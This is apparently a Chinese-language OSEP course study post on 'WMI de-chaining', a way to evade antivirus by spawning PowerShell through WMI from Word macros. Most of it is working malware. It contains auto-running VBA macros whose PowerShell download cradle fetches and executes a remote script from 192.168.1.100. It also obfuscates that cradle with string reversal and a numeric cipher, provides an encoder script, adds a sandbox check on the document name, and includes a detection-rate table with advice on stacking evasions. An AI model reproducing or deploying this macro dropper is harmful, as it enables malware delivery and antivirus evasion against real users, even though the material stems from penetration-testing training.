---
title: OSEP-07-WMI解链技术
description: '07-杀软绕过 | 08-WMI解链技术'
pubDate: 2026-01-30T00:01:07+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
---

# WMI 解链技术详解

## 写在前面

WMI（Windows Management Instrumentation）解链技术是一种高级的杀软绕过技术，通过使用 WMI 创建进程来避免父子进程关系检测。本章详细介绍 WMI 解链的原理和实现方法。

---

## 一、为什么需要解链

### 1.1 父子进程关系检测

```
传统 VBA 宏执行 PowerShell:

WINWORD.EXE (父进程)
    └── powershell.exe (子进程)

问题:
- 杀软检测到 Word 启动 PowerShell
- 这是典型的恶意行为模式
- 会触发行为检测告警
```

### 1.2 解链后的进程关系

```
使用 WMI 解链后:

WINWORD.EXE
    └── (通过 WMI 请求)

WmiPrvSE.exe (WMI Provider Host)
    └── powershell.exe

效果:
- PowerShell 不再是 Word 的子进程
- 进程关系看起来更正常
- 可以绕过父子进程检测
```

---

## 二、WMI 基础

### 2.1 WMI 架构

```
WMI 架构:

┌─────────────────────────────────────────────────────────────┐
│  应用程序 (VBA, PowerShell, C#)                             │
└─────────────────────────────┬───────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  WMI 服务 (winmgmt)                                         │
│  运行在 SVCHOST.EXE 中                                      │
└─────────────────────────────┬───────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  WMI Provider Host (WmiPrvSE.exe)                           │
│  执行实际操作                                                │
└─────────────────────────────────────────────────────────────┘
```

### 2.2 WMI 命名空间和类

```
WMI 结构:

root
├── CIMV2
│   ├── Win32_Process      # 进程管理
│   ├── Win32_Service      # 服务管理
│   └── Win32_OperatingSystem
├── SecurityCenter2
│   └── AntiVirusProduct   # 杀软信息
└── ...

常用类:
- Win32_Process: 创建/终止进程
- Win32_Service: 管理服务
- Win32_ScheduledJob: 计划任务
```

---

## 三、VBA 中使用 WMI

### 3.1 基本语法

```vba
' 连接到 WMI
Set objWMI = GetObject("winmgmts:")

' 获取 Win32_Process 类
Set objProcess = objWMI.Get("Win32_Process")

' 创建进程
objProcess.Create "cmd.exe", Null, Null, pid
```

### 3.2 完整示例

```vba
Sub MyMacro()
    Dim strArg As String
    Dim pid As Long

    ' PowerShell 命令
    strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.1.100/run.txt'))"

    ' 使用 WMI 创建进程
    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub
```

### 3.3 Create 方法参数

```vba
' Win32_Process.Create 方法签名
Create(
    CommandLine,      ' 要执行的命令
    CurrentDirectory, ' 工作目录 (可选)
    ProcessStartupInformation, ' 启动信息 (可选)
    ProcessId         ' 输出: 进程 ID
)

' 示例
GetObject("winmgmts:").Get("Win32_Process").Create _
    "powershell.exe", _  ' 命令
    Null, _              ' 工作目录
    Null, _              ' 启动信息
    pid                  ' 进程 ID
```

---

## 四、64位 vs 32位

### 4.1 Office 位数影响

```
Office 位数影响:

32位 Office:
- WMI 创建的进程默认是 32位
- 需要指定完整路径使用 64位 PowerShell

64位 Office:
- WMI 创建的进程默认是 64位
- 可以直接使用 "powershell"
```

### 4.2 指定 64位 PowerShell

```vba
' 32位 Office 中使用 64位 PowerShell
strArg = "C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe -exec bypass ..."

' 64位 Office 中直接使用
strArg = "powershell -exec bypass ..."
```

---

## 五、结合混淆技术

### 5.1 字符串反转

```vba
' 使用 StrReverse 混淆
Function bears(cows)
    bears = StrReverse(cows)
End Function

Sub MyMacro()
    Dim strArg As String

    ' 反转的 PowerShell 命令
    strArg = bears("))'txt.nur/001.1.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")

    ' 反转的 WMI 字符串
    GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create strArg, Null, Null, pid
End Sub
```

### 5.2 Caesar 密码加密

```vba
' 解密函数
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
        Oatmilk = Oatmilk + Pears(Strawberries(Milk))
        Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Sub MyMacro()
    Dim Apples As String
    Dim Water As String

    ' 加密的 PowerShell 命令
    Apples = "129128136118131132121118125125049062..."

    Water = Nuts(Apples)

    ' 加密的 WMI 字符串
    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Sub
```

### 5.3 加密脚本 (PowerShell)

```powershell
# 加密脚本
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.1.100/run.txt'))"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1) {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2) {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3) {
        $output += $thischar
    }
}

$output | clip
Write-Host "Encrypted payload copied to clipboard"
```

---

## 六、结合沙箱检测

### 6.1 文档名检查

```vba
' 沙箱通常会重命名文档
If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
    Exit Function
End If

' "131134127127118131063117128116" 解密后是 "runner.doc"
```

### 6.2 完整示例

```vba
' 解密函数
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
        Oatmilk = Oatmilk + Pears(Strawberries(Milk))
        Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
    Dim Apples As String
    Dim Water As String

    ' 检查文档名（沙箱检测）
    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
        Exit Function
    End If

    ' 加密的 PowerShell 命令
    Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063066066074063066067065064115128128124063133137133056058058"

    Water = Nuts(Apples)

    ' 使用 WMI 创建进程
    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub
```

---

## 七、检测率对比

### 7.1 各阶段检测率

```
检测率对比 (AntiScan.Me):

1. 基本 PowerShell 下载器:        8/26 检测
2. 使用 WMI 解链:                 7/26 检测
3. 使用 StrReverse 混淆:          4/26 检测
4. 使用 Caesar 密码加密:          2/26 检测
5. 加上文档名检查:                1/26 检测

结论: 组合多种技术可以显著降低检测率
```

### 7.2 技术组合建议

```
推荐组合:

1. WMI 解链
   + 避免父子进程检测

2. 字符串加密
   + 避免签名检测

3. 沙箱检测
   + 避免动态分析

4. VBA Stomping (可选)
   + 进一步降低检测率
```

---

## 八、练习题

### 选择题

1. WMI 解链的主要目的是什么？
   - A) 加快执行速度
   - B) 避免父子进程关系检测
   - C) 加密代码
   - D) 压缩文件

2. WmiPrvSE.exe 是什么？
   - A) 恶意软件
   - B) WMI Provider Host
   - C) PowerShell 进程
   - D) Word 进程

3. Win32_Process.Create 的第一个参数是什么？
   - A) 进程 ID
   - B) 工作目录
   - C) 命令行
   - D) 启动信息

4. 为什么要检查文档名？
   - A) 验证文件完整性
   - B) 检测沙箱环境
   - C) 加密文件
   - D) 压缩文件

5. StrReverse 函数的作用是什么？
   - A) 加密字符串
   - B) 反转字符串
   - C) 压缩字符串
   - D) 删除字符串

### 答案

1-B, 2-B, 3-C, 4-B, 5-B

---

## 下一步

掌握了 WMI 解链技术后，继续学习 [08-AMSI绕过](/blog/osep/08-amsi绕过/00-章节指南/) 技术，了解 AMSI 绕过和其他高级技术。
